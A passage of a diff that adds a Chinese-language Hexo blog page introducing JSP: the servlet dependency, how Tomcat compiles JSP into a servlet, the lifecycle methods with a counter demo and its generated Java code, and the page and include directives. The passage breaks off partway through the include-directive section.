@@ -1,0 +1,988 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.ico">
+  <link rel="icon" href="/img/avatar.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pacemrc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="JSP导入依赖tomcat对jsp页面的支持 &lt;dependency&gt; 	&lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; 	&lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt; 	&lt;version&gt;4.0.1&lt;&#x2F;version&gt; 	&lt;scope&gt;prov">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JSP">
+<meta property="og:url" content="https://pacemrc.github.io/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Jsp/index.html">
+<meta property="og:site_name" content="白日梦想家">
+<meta property="og:description" content="JSP导入依赖tomcat对jsp页面的支持 &lt;dependency&gt; 	&lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; 	&lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt; 	&lt;version&gt;4.0.1&lt;&#x2F;version&gt; 	&lt;scope&gt;prov">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230820164829124.png">
+<meta property="og:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/CDATA.png">
+<meta property="article:published_time" content="2024-01-19T09:05:07.000Z">
+<meta property="article:modified_time" content="2025-11-26T11:02:09.739Z">
+<meta property="article:author" content="pacemrc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230820164829124.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>JSP - 白日梦想家</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pacemrc.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>白日梦想家</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/category.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JSP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        pacemrc
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-19 17:05" pubdate>
+          2024年1月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-10 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JSP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><p>tomcat对jsp页面的支持</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+<h2 id="jsp运行过程"><a href="#jsp运行过程" class="headerlink" title="jsp运行过程"></a>jsp运行过程</h2><div class="code-wrapper"><pre><code class="hljs angelscript">请求JSP的流程大致如下：在第一次请求相应的JSP时，会将jsp进行一轮jsp语法的解析，解析主要是从jsp的语法解析到java语法，在默认为work的目录下生成相应的java文件(内容本质是一个Servlet)，之后在对java文件进行编译，生成对应的<span class="hljs-keyword">class</span>文件并且加载到<span class="hljs-symbol">JVM</span>中。</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230820164829124.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-JyUsgWJjfvS8dmeuhTB9w">https://mp.weixin.qq.com/s/-JyUsgWJjfvS8dmeuhTB9w</a></p>
+<h2 id="jsp生命周期"><a href="#jsp生命周期" class="headerlink" title="jsp生命周期"></a>jsp生命周期</h2><p>编译</p>
+<p>初始化</p>
+<div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_jspInit</span>(<span class="hljs-params"></span>) &#123;
+&#125;</code></pre></div>
+
+<p>服务</p>
+<div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_jspService</span>(<span class="hljs-params"></span>) &#123;
+&#125;</code></pre></div>
+
+<p>销毁</p>
+<div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_jspDestroy</span>(<span class="hljs-params"></span>) &#123;
+&#125;</code></pre></div>
+
+<p><strong>测试代码</strong></p>
+<div class="code-wrapper"><pre><code class="hljs erb"><span class="language-xml">&lt;%</span><span class="language-ruby">@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span></span>
+<span class="language-ruby">         pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span></span><span class="language-xml">%&gt;</span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>demo01<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span>
+<span class="language-xml"></span>
+<span class="language-xml">&lt;%</span><span class="language-ruby">!</span>
+<span class="language-ruby">    <span class="hljs-keyword">private</span> int initVar=<span class="hljs-number">0</span>;</span>
+<span class="language-ruby">    <span class="hljs-keyword">private</span> int serviceVar=<span class="hljs-number">0</span>;</span>
+<span class="language-ruby">    <span class="hljs-keyword">private</span> int destroyVar=<span class="hljs-number">0</span>;</span>
+<span class="language-ruby"></span>
+<span class="language-ruby">    <span class="hljs-keyword">public</span> void jspInit()&#123;</span>
+<span class="language-ruby">        initVar++;</span>
+<span class="language-ruby">        <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;jspInit(): JSP被初始化了&quot;</span>+initVar+<span class="hljs-string">&quot;次&quot;</span>);</span>
+<span class="language-ruby">    &#125;</span>
+<span class="language-ruby">    <span class="hljs-keyword">public</span> void jspDestroy()&#123;</span>
+<span class="language-ruby">        destroyVar++;</span>
+<span class="language-ruby">        <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;jspDestroy(): JSP被销毁了&quot;</span>+destroyVar+<span class="hljs-string">&quot;次&quot;</span>);</span>
+<span class="language-ruby">    &#125;</span>
+<span class="language-ruby"></span><span class="language-xml">%&gt;</span>
+<span class="language-xml"></span>
+<span class="language-xml">&lt;%</span><span class="language-ruby"></span>
+<span class="language-ruby">    serviceVar++;</span>
+<span class="language-ruby">    <span class="hljs-title class_">System</span>.out.println(<span class="hljs-string">&quot;_jspService(): JSP共响应了&quot;</span>+serviceVar+<span class="hljs-string">&quot;次请求&quot;</span>);</span>
+<span class="language-ruby"></span>
+<span class="language-ruby">    <span class="hljs-title class_">String</span> content1=<span class="hljs-string">&quot;初始化阶段：初始化次数 : &quot;</span>+initVar;</span>
+<span class="language-ruby">    <span class="hljs-title class_">String</span> content2=<span class="hljs-string">&quot;执行阶段：响应客户端请求次数 : &quot;</span>+serviceVar;</span>
+<span class="language-ruby">    <span class="hljs-title class_">String</span> content3=<span class="hljs-string">&quot;销毁阶段：销毁次数 : &quot;</span>+destroyVar;</span>
+<span class="language-ruby"></span><span class="language-xml">%&gt;</span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Jsp生命周期-测试实例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&lt;%=</span><span class="language-ruby">content1 </span><span class="language-xml">%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&lt;%=</span><span class="language-ruby">content2 </span><span class="language-xml">%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&lt;%=</span><span class="language-ruby">content3 </span><span class="language-xml">%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+<span class="language-xml"></span>
+<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre></div>
+
+<p><strong>tomcat解析后的java代码</strong></p>
+<div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-comment">/*</span>
+<span class="hljs-comment"> * Generated by the Jasper component of Apache Tomcat</span>
+<span class="hljs-comment"> * Version: Apache Tomcat/8.5.50</span>
+<span class="hljs-comment"> * Generated at: 2023-08-20 08:58:44 UTC</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">Note:</span> The last modified time of this file was set to</span>
+<span class="hljs-comment"> *       the last modified time of the source file after</span>
+<span class="hljs-comment"> *       generation to assist with modification tracking.</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-keyword">package</span> org.apache.jsp;
+
+<span class="hljs-keyword">import</span> javax.servlet.*;
+<span class="hljs-keyword">import</span> javax.servlet.http.*;
+<span class="hljs-keyword">import</span> javax.servlet.jsp.*;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> index_jsp <span class="hljs-keyword">extends</span> org.apache.jasper.<span class="hljs-keyword">runtime</span>.HttpJspBase
+    <span class="hljs-keyword">implements</span> org.apache.jasper.<span class="hljs-keyword">runtime</span>.JspSourceDependent,
+                 org.apache.jasper.<span class="hljs-keyword">runtime</span>.JspSourceImports &#123;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> initVar=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> serviceVar=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> destroyVar=<span class="hljs-number">0</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> jspInit()&#123;
+        initVar++;
+        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;jspInit(): JSP被初始化了&quot;</span>+initVar+<span class="hljs-string">&quot;次&quot;</span>);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> jspDestroy()&#123;
+        destroyVar++;
+        System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;jspDestroy(): JSP被销毁了&quot;</span>+destroyVar+<span class="hljs-string">&quot;次&quot;</span>);
+    &#125;
+
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> javax.servlet.jsp.JspFactory _jspxFactory =
+          javax.servlet.jsp.JspFactory.getDefaultFactory();
+
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.<span class="hljs-keyword">Long</span>&gt; _jspx_dependants;
+
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;
+
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;
+
+  <span class="hljs-keyword">static</span> &#123;
+    _jspx_imports_packages = <span class="hljs-keyword">new</span> java.util.HashSet&lt;&gt;();
+    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet&quot;</span>);
+    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.http&quot;</span>);
+    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.jsp&quot;</span>);
+    _jspx_imports_classes = <span class="hljs-keyword">null</span>;
+  &#125;
+
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;
+
+  <span class="hljs-keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.<span class="hljs-keyword">Long</span>&gt; getDependants() &#123;
+    <span class="hljs-keyword">return</span> _jspx_dependants;
+  &#125;
+
+  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;
+    <span class="hljs-keyword">return</span> _jspx_imports_packages;
+  &#125;
+
+  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;
+    <span class="hljs-keyword">return</span> _jspx_imports_classes;
+  &#125;
+
+  <span class="hljs-keyword">public</span> javax.el.ExpressionFactory _jsp_getExpressionFactory() &#123;
+    <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-keyword">null</span>) &#123;
+      <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>) &#123;
+        <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-keyword">null</span>) &#123;
+          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();
+        &#125;
+      &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> _el_expressionfactory;
+  &#125;
+
+  <span class="hljs-keyword">public</span> org.apache.tomcat.InstanceManager _jsp_getInstanceManager() &#123;
+    <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-keyword">null</span>) &#123;
+      <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>) &#123;
+        <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-keyword">null</span>) &#123;
+          _jsp_instancemanager = org.apache.jasper.<span class="hljs-keyword">runtime</span>.InstanceManagerFactory.getInstanceManager(getServletConfig());
+        &#125;
+      &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> _jsp_instancemanager;
+  &#125;
+
+  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> _jspInit() &#123;
+  &#125;
+
+  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> _jspDestroy() &#123;
+  &#125;
+
+  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> _jspService(<span class="hljs-keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="hljs-keyword">final</span> javax.servlet.http.HttpServletResponse response)
+      <span class="hljs-keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;
+
+    <span class="hljs-keyword">final</span> java.lang.String _jspx_method = request.getMethod();
+    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;
+      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="hljs-string">&quot;JSPs only permit GET POST or HEAD&quot;</span>);
+      <span class="hljs-keyword">return</span>;
+    &#125;
+
+    <span class="hljs-keyword">final</span> javax.servlet.jsp.PageContext pageContext;
+    javax.servlet.http.HttpSession session = <span class="hljs-keyword">null</span>;
+    <span class="hljs-keyword">final</span> javax.servlet.ServletContext application;
+    <span class="hljs-keyword">final</span> javax.servlet.ServletConfig config;
+    javax.servlet.jsp.JspWriter out = <span class="hljs-keyword">null</span>;
+    <span class="hljs-keyword">final</span> java.lang.Object page = <span class="hljs-keyword">this</span>;
+    javax.servlet.jsp.JspWriter _jspx_out = <span class="hljs-keyword">null</span>;
+    javax.servlet.jsp.PageContext _jspx_page_context = <span class="hljs-keyword">null</span>;
+
+    <span class="hljs-keyword">try</span> &#123;
+      response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);
+      pageContext = _jspxFactory.getPageContext(<span class="hljs-keyword">this</span>, request, response,
+      			<span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>, <span class="hljs-number">8192</span>, <span class="hljs-keyword">true</span>);
+      _jspx_page_context = pageContext;
+      application = pageContext.getServletContext();
+      config = pageContext.getServletConfig();
+      session = pageContext.getSession();
+      out = pageContext.<span class="hljs-keyword">getOut</span>();
+      _jspx_out = out;
+
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;html&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;head&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;    &lt;title&gt;demo01&lt;/title&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/head&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;body&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;\\\\n&#x27;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;\\\\n&#x27;</span>);
+
+    serviceVar++;
+    System.out.<span class="hljs-keyword">println</span>(<span class="hljs-string">&quot;_jspService(): JSP共响应了&quot;</span>+serviceVar+<span class="hljs-string">&quot;次请求&quot;</span>);
+
+    String content1=<span class="hljs-string">&quot;初始化阶段：初始化次数 : &quot;</span>+initVar;
+    String content2=<span class="hljs-string">&quot;执行阶段：响应客户端请求次数 : &quot;</span>+serviceVar;
+    String content3=<span class="hljs-string">&quot;销毁阶段：销毁次数 : &quot;</span>+destroyVar;
+
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;h1&gt;Jsp生命周期-测试实例&lt;/h1&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>);
+      out.<span class="hljs-keyword">print</span>(content1 );
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/p&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>);
+      out.<span class="hljs-keyword">print</span>(content2 );
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/p&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;p&gt;&quot;</span>);
+      out.<span class="hljs-keyword">print</span>(content3 );
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/p&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/body&gt;\\\\n&quot;</span>);
+      out.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;&lt;/html&gt;&quot;</span>);
+    &#125; <span class="hljs-keyword">catch</span> (java.lang.Throwable t) &#123;
+      <span class="hljs-keyword">if</span> (!(t <span class="hljs-keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;
+        out = _jspx_out;
+        <span class="hljs-keyword">if</span> (out != <span class="hljs-keyword">null</span> &amp;&amp; out.getBufferSize() != <span class="hljs-number">0</span>)
+          <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-keyword">if</span> (response.isCommitted()) &#123;
+              out.flush();
+            &#125; <span class="hljs-keyword">else</span> &#123;
+              out.clearBuffer();
+            &#125;
+          &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;&#125;
+        <span class="hljs-keyword">if</span> (_jspx_page_context != <span class="hljs-keyword">null</span>) _jspx_page_context.handlePageException(t);
+        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ServletException(t);
+      &#125;
+    &#125; <span class="hljs-keyword">finally</span> &#123;
+      _jspxFactory.releasePageContext(_jspx_page_context);
+    &#125;
+  &#125;
+&#125;</code></pre></div>
+
+<h2 id="jsp指令"><a href="#jsp指令" class="headerlink" title="jsp指令"></a>jsp指令</h2><p>JSP指令用来设置整个JSP页面相关的属性。</p>
+<h3 id="page指令"><a href="#page指令" class="headerlink" title="page指令"></a>page指令</h3><p>功能：</p>
+<div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">Page</span>指令为容器提供当前页面的使用说明。一个JSP页面可以包含多个<span class="hljs-attribute">page</span>指令。</code></pre></div>
+
+<p>语法：</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql">&lt;%@ page <span class="hljs-keyword">attribute</span>=&quot;value&quot; %&gt;
+等价<span class="hljs-type">xml</span>语法：
+&lt;jsp:directive.page <span class="hljs-keyword">attribute</span>=&quot;value&quot; /&gt;</code></pre></div>
+
+<p>常用属性：</p>
+<div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">import:</span>导入要使用的Java类
+<span class="hljs-symbol">language:</span>定义JSP页面所用的脚本语言，默认是Java
+<span class="hljs-symbol">contentType:</span>指定当前JSP页面的MIME类型和字符编码
+<span class="hljs-symbol">pageEncoding:</span>jsp页面编码，默认是UTF<span class="hljs-number">-8</span></code></pre></div>
+
+<h3 id="include指令"><a href="#include指令" class="headerlink" title="include指令"></a>include指令</h3><p>功能：</p>
+<div class="code-wrapper"><pre><code class="hljs actionscript">JSP可以通过<span class="hljs-meta"><span class="hljs-keyword">include</span>指令来包含其他文件。被包含的文件可以是JSP文件、HTML文件或文本文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。</span></code></pre></div>
+
+<p>语法：</p>
+<div class="code-wrapper"><pre><code class="hljs cmake">&lt;%@ <span class="hljs-keyword">include</span> <span class="hljs-keyword">file</span>=<span class="hljs-string">&quot;文件相对 url 地址&quot;</span> %&gt;
+等价XML语法：
